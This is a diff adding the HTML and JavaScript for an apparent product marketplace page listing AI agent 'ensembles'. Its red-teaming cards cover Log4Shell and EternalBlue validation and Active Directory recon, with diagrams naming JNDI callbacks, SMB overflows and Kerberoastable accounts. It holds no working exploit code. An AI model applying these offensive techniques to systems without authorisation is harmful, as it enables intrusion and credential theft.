+            <text x="18" y="130" font-family="monospace" font-size="5.5" fill="#4a6280">INFO  08:12:16 POST /login 401</text>
+            <text x="18" y="142" font-family="monospace" font-size="5.5" fill="#4a6280">INFO  08:12:19 GET /api/data 200</text>
+            <text x="18" y="154" font-family="monospace" font-size="5.5" fill="#4a6280">INFO  08:12:22 ...</text>
+            <!-- JNDI label -->
+            <text x="224" y="68" font-family="monospace" font-size="6.5" fill="#f97316" opacity="0.9">JNDI</text>
+            <text x="222" y="79" font-family="monospace" font-size="6.5" fill="#f97316" opacity="0.9">LOOKUP</text>
+            <!-- Callback arrow from malicious line to attacker server -->
+            <line x1="216" y1="82" x2="248" y2="82" stroke="#f97316" stroke-width="1.3" marker-end="url(#s4ca)"/>
+            <!-- Attacker LDAP server box -->
+            <rect x="250" y="62" width="58" height="42" rx="3" fill="#1a1208" stroke="#f97316" stroke-width="1"/>
+            <text x="279" y="78"  font-family="monospace" font-size="5.5" fill="#f97316" text-anchor="middle">LDAP</text>
+            <text x="279" y="89"  font-family="monospace" font-size="5.5" fill="#f97316" text-anchor="middle">:1389</text>
+            <text x="279" y="99"  font-family="monospace" font-size="4.5" fill="#f97316" opacity="0.6" text-anchor="middle">attacker</text>
+            <!-- CVE tag -->
+            <text x="222" y="155" font-family="monospace" font-size="6" fill="#ef4444" opacity="0.45">CVE-2021-44228</text>
+          </svg>
+        </div>
+        <div class="card-body">
+          <span class="card-tag c-orange">Exploit Package</span>
+          <div class="card-name">Apache Log4Shell (CVE-2021-44228)</div>
+          <div class="card-desc">Detection and safe proof-of-concept validation for Log4Shell across Java application stacks. Triggers JNDI lookup callbacks to confirm exploitability without payload execution or remote class loading.</div>
+          <div class="card-composition">
+            <div class="comp-item"><span class="comp-val">2</span>Agent Elements</div>
+            <div class="comp-item"><span class="comp-val">6</span>Skills Granules</div>
+            <div class="comp-item"><span class="comp-val">1</span>Knowledge Granules</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Card 5: EternalBlue -->
+      <div class="card">
+        <div class="card-thumb">
+          <svg viewBox="0 0 320 180" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:100%;display:block">
+            <defs>
+              <marker id="s5ra" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
+                <polygon points="0,0 6,3 0,6" fill="#ef4444"/>
+              </marker>
+            </defs>
+            <rect width="320" height="180" fill="#060d18"/>
+            <!-- Windows target (right) -->
+            <rect x="192" y="28" width="114" height="76" rx="3" fill="#0a1628" stroke="#1a2d45" stroke-width="1"/>
+            <rect x="192" y="28" width="114" height="10" rx="3" fill="#1a2d45"/>
+            <!-- Windows logo (4 panes) -->
+            <rect x="200" y="44" width="11" height="11" fill="#3b82f6" opacity="0.55"/>
+            <rect x="213" y="44" width="11" height="11" fill="#3b82f6" opacity="0.55"/>
+            <rect x="200" y="57" width="11" height="11" fill="#3b82f6" opacity="0.55"/>
+            <rect x="213" y="57" width="11" height="11" fill="#3b82f6" opacity="0.55"/>
+            <text x="232" y="50" font-family="monospace" font-size="7"   fill="#cbd5e1" opacity="0.8">Windows</text>
+            <text x="232" y="62" font-family="monospace" font-size="6"   fill="#4a6280">SMBv1 :445</text>
+            <text x="232" y="74" font-family="monospace" font-size="6"   fill="#ef4444">UNPATCHED</text>
+            <text x="232" y="85" font-family="monospace" font-size="5"   fill="#4a6280" opacity="0.7">pre-MS17-010</text>
+            <!-- SMB protocol stack (left) — layers bottom to top -->
+            <rect x="18" y="118" width="148" height="15" rx="1" fill="#0d1e33" stroke="#1a2d45" stroke-width="0.8"/>
+            <text x="92" y="129" font-family="monospace" font-size="5.5" fill="#4a6280" text-anchor="middle">TCP/IP layer</text>
+            <rect x="18" y="101" width="148" height="15" rx="1" fill="#0d1e33" stroke="#1a2d45" stroke-width="0.8"/>
+            <text x="92" y="112" font-family="monospace" font-size="5.5" fill="#4a6280" text-anchor="middle">NetBIOS session</text>
+            <rect x="18" y="84"  width="148" height="15" rx="1" fill="#0d1e33" stroke="#1a2d45" stroke-width="0.8"/>
+            <text x="92" y="95"  font-family="monospace" font-size="5.5" fill="#4a6280" text-anchor="middle">SMBv1 protocol</text>
+            <!-- Vulnerable Trans2 layer — red highlight -->
+            <rect x="12" y="64"  width="160" height="17" rx="1" fill="#1a0808" stroke="#ef4444" stroke-width="1"/>
+            <text x="92" y="76"  font-family="monospace" font-size="5.5" fill="#ef4444" text-anchor="middle">Trans2 REQUEST → overflow</text>
+            <!-- Buffer spill above -->
+            <rect x="24" y="44"  width="136" height="17" rx="1" fill="#2a0e0e" stroke="#ef4444" stroke-width="0.8" stroke-dasharray="3,2"/>
+            <text x="92" y="56"  font-family="monospace" font-size="5.5" fill="#ef4444" text-anchor="middle" opacity="0.85">overwrite return address</text>
+            <!-- Exploit packet arrow from right -->
+            <line x1="190" y1="73" x2="174" y2="73" stroke="#ef4444" stroke-width="1.5" marker-end="url(#s5ra)"/>
+            <text x="193" y="69" font-family="monospace" font-size="5"   fill="#ef4444" opacity="0.85">exploit</text>
+            <text x="193" y="79" font-family="monospace" font-size="5"   fill="#ef4444" opacity="0.65">packet →</text>
+            <!-- Background label -->
+            <text x="18" y="168" font-family="monospace" font-size="9" fill="#1a2d45">MS17-010</text>
+            <text x="242" y="145" font-family="monospace" font-size="20" fill="#0d1e33" opacity="0.4">445</text>
+          </svg>
+        </div>
+        <div class="card-body">
+          <span class="card-tag c-orange">Exploit Package</span>
+          <div class="card-name">EternalBlue (MS17-010)</div>
+          <div class="card-desc">SMBv1 exploitability assessment for Windows targets — probes MS17-010 patch state and transaction response behaviour. Detection-only by default; operator confirmation gates each PoC stage.</div>
+          <div class="card-composition">
+            <div class="comp-item"><span class="comp-val">3</span>Agent Elements</div>
+            <div class="comp-item"><span class="comp-val">7</span>Skills Granules</div>
+            <div class="comp-item"><span class="comp-val">1</span>Knowledge Granules</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Card 6: Active Directory Recon -->
+      <div class="card">
+        <div class="card-thumb">
+          <svg viewBox="0 0 320 180" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:100%;display:block">
+            <defs>
+              <marker id="s6la" markerWidth="5" markerHeight="5" refX="4" refY="2.5" orient="auto">
+                <polygon points="0,0 5,2.5 0,5" fill="#3b82f6"/>
+              </marker>
+            </defs>
+            <rect width="320" height="180" fill="#060d18"/>
+            <!-- Domain Controller -->
+            <rect x="110" y="12" width="100" height="26" rx="3" fill="#0d1e33" stroke="#3b82f6" stroke-width="1.2"/>
+            <text x="160" y="24"  font-family="monospace" font-size="6"   fill="#3b82f6" text-anchor="middle" font-weight="700">CORP.INTERNAL</text>
+            <text x="160" y="33"  font-family="monospace" font-size="5"   fill="#4a6280" text-anchor="middle">Domain Controller</text>
+            <!-- Tree lines L1 -->
+            <line x1="136" y1="38" x2="72"  y2="62" stroke="#1a2d45" stroke-width="1"/>
+            <line x1="160" y1="38" x2="160" y2="62" stroke="#1a2d45" stroke-width="1"/>
+            <line x1="184" y1="38" x2="248" y2="62" stroke="#1a2d45" stroke-width="1"/>
+            <!-- OU nodes -->
+            <rect x="32"  y="62" width="80" height="18" rx="2" fill="#0a1628" stroke="#1a2d45" stroke-width="0.8"/>
+            <text x="72"  y="74" font-family="monospace" font-size="5.5" fill="#4a6280" text-anchor="middle">OU=Servers</text>
+            <rect x="120" y="62" width="80" height="18" rx="2" fill="#0a1628" stroke="#1a2d45" stroke-width="0.8"/>
+            <text x="160" y="74" font-family="monospace" font-size="5.5" fill="#4a6280" text-anchor="middle">OU=Users</text>
+            <rect x="208" y="62" width="80" height="18" rx="2" fill="#0a1628" stroke="#f97316" stroke-width="0.9"/>
+            <text x="248" y="74" font-family="monospace" font-size="5.5" fill="#f97316" text-anchor="middle">OU=SvcAccounts</text>
+            <!-- Tree lines L2 -->
+            <line x1="52"  y1="80" x2="52"  y2="98" stroke="#1a2d45" stroke-width="0.7"/>
+            <line x1="92"  y1="80" x2="92"  y2="98" stroke="#1a2d45" stroke-width="0.7"/>
+            <line x1="144" y1="80" x2="144" y2="98" stroke="#1a2d45" stroke-width="0.7"/>
+            <line x1="176" y1="80" x2="176" y2="98" stroke="#1a2d45" stroke-width="0.7"/>
+            <line x1="230" y1="80" x2="230" y2="98" stroke="#f97316" stroke-width="0.7"/>
+            <line x1="266" y1="80" x2="266" y2="98" stroke="#f97316" stroke-width="0.7"/>
+            <!-- Leaf nodes -->
+            <rect x="30"  y="98" width="44" height="14" rx="2" fill="#0a1628" stroke="#243d5a" stroke-width="0.6"/>
+            <text x="52"  y="109" font-family="monospace" font-size="4.5" fill="#4a6280" text-anchor="middle">DC01</text>
+            <rect x="70"  y="98" width="44" height="14" rx="2" fill="#0a1628" stroke="#243d5a" stroke-width="0.6"/>
+            <text x="92"  y="109" font-family="monospace" font-size="4.5" fill="#4a6280" text-anchor="middle">FILE01</text>
+            <rect x="122" y="98" width="44" height="14" rx="2" fill="#0a1628" stroke="#243d5a" stroke-width="0.6"/>
+            <text x="144" y="109" font-family="monospace" font-size="4.5" fill="#4a6280" text-anchor="middle">j.smith</text>
+            <rect x="154" y="98" width="44" height="14" rx="2" fill="#0a1628" stroke="#243d5a" stroke-width="0.6"/>
+            <text x="176" y="109" font-family="monospace" font-size="4.5" fill="#4a6280" text-anchor="middle">a.jones</text>
+            <!-- Kerberoastable SVC accounts — highlighted -->
+            <rect x="208" y="98" width="44" height="14" rx="2" fill="#1a1208" stroke="#f97316" stroke-width="0.9"/>
+            <text x="230" y="109" font-family="monospace" font-size="4.5" fill="#f97316" text-anchor="middle">svc_sql</text>
+            <rect x="244" y="98" width="44" height="14" rx="2" fill="#1a1208" stroke="#f97316" stroke-width="0.9"/>
+            <text x="266" y="109" font-family="monospace" font-size="4.5" fill="#f97316" text-anchor="middle">svc_web</text>
+            <!-- SPN / Kerberoast labels -->
+            <text x="208" y="126" font-family="monospace" font-size="5"   fill="#f97316" opacity="0.85">MSSQLSvc/sql01.corp</text>
+            <text x="208" y="137" font-family="monospace" font-size="5"   fill="#f97316" opacity="0.65">HTTP/web01.corp</text>
+            <text x="208" y="148" font-family="monospace" font-size="5"   fill="#f97316" opacity="0.5">→ Kerberoastable</text>
+            <!-- LDAP anon query arrow from left -->
+            <line x1="12" y1="25" x2="108" y2="25" stroke="#3b82f6" stroke-width="1" stroke-dasharray="4,3" marker-end="url(#s6la)" opacity="0.8"/>
+            <text x="12" y="21" font-family="monospace" font-size="5.5" fill="#3b82f6" opacity="0.8">LDAP anon bind</text>
+          </svg>
+        </div>
+        <div class="card-body">
+          <span class="card-tag c-red">Red Teaming</span>
+          <div class="card-name">Active Directory Recon</div>
+          <div class="card-desc">Enumerates AD environments via anonymous LDAP binds and null sessions — domain topology, trust relationships, GPO misconfiguration, and SPNs registered to Kerberoastable service accounts.</div>
+          <div class="card-composition">
+            <div class="comp-item"><span class="comp-val">4</span>Agent Elements</div>
+            <div class="comp-item"><span class="comp-val">11</span>Skills Granules</div>
+            <div class="comp-item"><span class="comp-val">4</span>Knowledge Granules</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Empty state -->
+    <div class="empty-state" id="empty-state">
+      <div class="empty-icon">📦</div>
+      <div class="empty-title" id="empty-title">Coming Soon</div>
+      <div class="empty-desc" id="empty-desc">Ensembles for this category are in development. Contributors can submit packages via the Athena developer portal.</div>
+      <span class="empty-tag">Notify me when available</span>
+    </div>
+
+  </main>
+</div>
+
+<script>
+  const POPULATED = new Set(['redteam']);
+
+  const CONTENT = {
+    // Industry
+    automotive:      { title: 'Automotive',                  desc: 'Ensembles for tier-1 supplier quality coordination, ADAS validation data pipelines, ECU software update orchestration, and production line yield root-cause analysis.' },
+    'life-sciences': { title: 'Life Sciences',               desc: 'GxP documentation automation, LIMS integration, clinical trial data coordination, eCTD regulatory submission assembly, and pharmacovigilance signal monitoring.' },
+    warehousing:     { title: 'Warehousing & Logistics',     desc: 'WMS integration, RFID asset tracking, pick-path optimisation, yard management coordination, and last-mile dispatch workflow automation.' },
+    maritime:        { title: 'Maritime & Ship Management',  desc: 'Voyage data recorder analysis, ISM Code documentation, ECDIS chart update management, port state control reporting, and crew certification tracking.' },
+    manufacturing:   { title: 'Manufacturing',               desc: 'MES integration, OEE analysis, SCADA event correlation, production scheduling, and ICS anomaly detection across discrete and process manufacturing environments.' },
+    govt:            { title: 'Govt & Public Services',      desc: 'Benefits adjudication, permit workflow automation, inter-agency data sharing, caseworker decision support, and FOIA request processing for public sector environments.' },
+    // Cybersecurity
+    iot:             { title: 'IoT Security',                desc: 'Security assessment across MQTT broker configurations, CoAP endpoint exposure, BLE pairing attack surfaces, OTA update pipeline integrity, and device provisioning credential handling.' },
+    datacenter:      { title: 'Data Center Security',        desc: 'Out-of-band management exposure (BMC/iDRAC), east-west micro-segmentation review, hypervisor host-escape surface analysis, and physical-to-virtual network boundary assessment.' },
+    'medical-sec':   { title: 'Medical Device Security',     desc: 'FDA premarket cybersecurity guidance (2023) alignment, IEC 62443 control verification, DICOM listener exposure, and HL7 FHIR API authentication review for networked clinical devices.' },
+    homeauto:        { title: 'Home Automation Security',    desc: 'Matter/Thread protocol security review, Z-Wave network enumeration, HomeKit accessory privilege assessment, and VLAN isolation verification between IoT and trusted network segments.' },
+    'cloud-aws':     { title: 'AWS',                         desc: 'Cloud security posture management, IAM misconfiguration detection, and S3 exposure analysis for AWS environments.' },
+    'cloud-azure':   { title: 'Azure',                       desc: 'Entra ID, Azure RBAC, and resource-group exposure ensembles for Microsoft Azure tenants.' },
+    'cloud-alibaba': { title: 'Alibaba Cloud',               desc: 'RAM policy analysis, OSS bucket auditing, and network security group review for Alibaba Cloud deployments.' },
+    'cloud-yandex':  { title: 'Yandex Cloud',                desc: 'IAM and storage posture assessment ensembles for Yandex Cloud infrastructure.' },
+    redteam:         { title: 'Red Teaming',                 desc: 'Complete agent ensembles for offensive security operations — network penetration, web application testing, credential access, and exploit validation packages.' },
+    // Assessments & Audits
+    pcidss:          { title: 'PCI-DSS',       desc: 'Automated gap analysis and evidence collection for PCI-DSS v4.0 compliance across cardholder data environments.' },
+    iso22301:        { title: 'ISO-22301',     desc: 'Business continuity management assessment ensembles covering BIA, recovery strategy review, and exercise documentation.' },
+    iso27001:        { title: 'ISO-27001',     desc: 'Information security management system gap analysis — control mapping, risk register review, and audit evidence collection aligned to ISO/IEC 27001:2022.' },
+    soc2:            { title: 'SOC 2 Type II', desc: 'Trust services criteria assessment for SaaS and cloud environments — maps controls across Security, Availability, Confidentiality, and Privacy with audit-ready evidence output.' },
+    dora:            { title: 'DORA',          desc: 'Digital Operational Resilience Act readiness assessment for EU financial entities — ICT risk management, incident classification, third-party risk, and TLPT alignment.' },
+    nis2:            { title: 'NIS2',          desc: 'NIS2 Directive compliance gap analysis for operators of essential and important entities — supply chain risk, incident reporting obligations, and technical control verification.' },
+    'nist-ai-rmf':   { title: 'AI NIST RMF',  desc: 'AI risk identification, governance mapping, and measurement ensembles aligned to the NIST AI Risk Management Framework 1.0.' },
+    // Components
+    'agents-pkg':    { title: 'Agents',                      desc: 'Individual specialist and leader agents available as standalone components for custom pipeline assembly.' },
+    'skills-pkg':    { title: 'Skills & Tools',              desc: 'Discrete tool skills — nmap wrappers, HTTP probes, database connectors — that can be composed into custom ensembles.' },
+    'knowledge-pkg': { title: 'Knowledge Bases',             desc: 'Curated knowledge packages: CVE feeds, compliance frameworks, threat intelligence, and domain-specific reference data.' },
+  };
+
+  let openGroups    = new Set(['cyber']);
+  let openSubGroups = new Set();
+  let activeItem    = 'redteam';
+  let activeIsSubItem = false;
+
+  function toggleGroup(id) {
+    const children = document.getElementById('gc-' + id);
+    const arrow    = document.getElementById('arrow-' + id);
+    const label    = document.getElementById('gl-' + id);
+    if (openGroups.has(id)) {
+      openGroups.delete(id);
+      children.classList.remove('nav-children--open');
+      arrow.classList.remove('nav-arrow--open');
+      label.classList.remove('nav-group-label--active');
+    } else {
+      openGroups.add(id);
+      children.classList.add('nav-children--open');
+      arrow.classList.add('nav-arrow--open');
+      label.classList.add('nav-group-label--active');
+    }
+  }
+
+  function toggleSubGroup(id) {
+    const children = document.getElementById('gsc-' + id);
+    const arrow    = document.getElementById('arrow-' + id);
+    const label    = document.getElementById('sgl-' + id);
+    if (openSubGroups.has(id)) {
+      openSubGroups.delete(id);
+      children.classList.remove('nav-subitems--open');
+      arrow.classList.remove('nav-arrow--open');
+      label.classList.remove('nav-subgroup-label--active');
+    } else {
+      openSubGroups.add(id);
+      children.classList.add('nav-subitems--open');
+      arrow.classList.add('nav-arrow--open');
+      label.classList.add('nav-subgroup-label--active');
+    }
+  }
+
+  function clearActive() {
+    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('nav-item--active'));
+    document.querySelectorAll('.nav-subitem').forEach(el => el.classList.remove('nav-subitem--active'));
+  }
+
+  function applyContent(id, parent) {
+    const info = CONTENT[id] || { title: id, desc: '' };
+    document.getElementById('breadcrumb').innerHTML = `Marketplace <span>› ${parent} › ${info.title}</span>`;
+    document.getElementById('main-title').textContent = info.title;
+    document.getElementById('main-desc').textContent  = info.desc;
+
+    const grid  = document.getElementById('card-grid');
+    const empty = document.getElementById('empty-state');
+    if (POPULATED.has(id)) {
+      grid.style.display = '';
+      empty.classList.remove('empty-state--visible');
+    } else {
+      grid.style.display = 'none';
+      empty.classList.add('empty-state--visible');
+      document.getElementById('empty-title').textContent = info.title + ' — Coming Soon';
+    }
+  }
+
+  function selectItem(id, parent) {
+    clearActive();
+    document.querySelectorAll('.nav-item').forEach(el => {
+      if (el.getAttribute('onclick') && el.getAttribute('onclick').includes("'" + id + "'"))
+        el.classList.add('nav-item--active');
+    });
+    activeItem = id;
+    applyContent(id, parent);
+  }
+
+  function selectSubItem(id, parent) {
+    clearActive();
+    document.querySelectorAll('.nav-subitem').forEach(el => {
+      if (el.getAttribute('onclick') && el.getAttribute('onclick').includes("'" + id + "'"))
+        el.classList.add('nav-subitem--active');
+    });
+    activeItem = id;
+    applyContent(id, parent);
+  }
+</script>
+
+</body>
+</html>
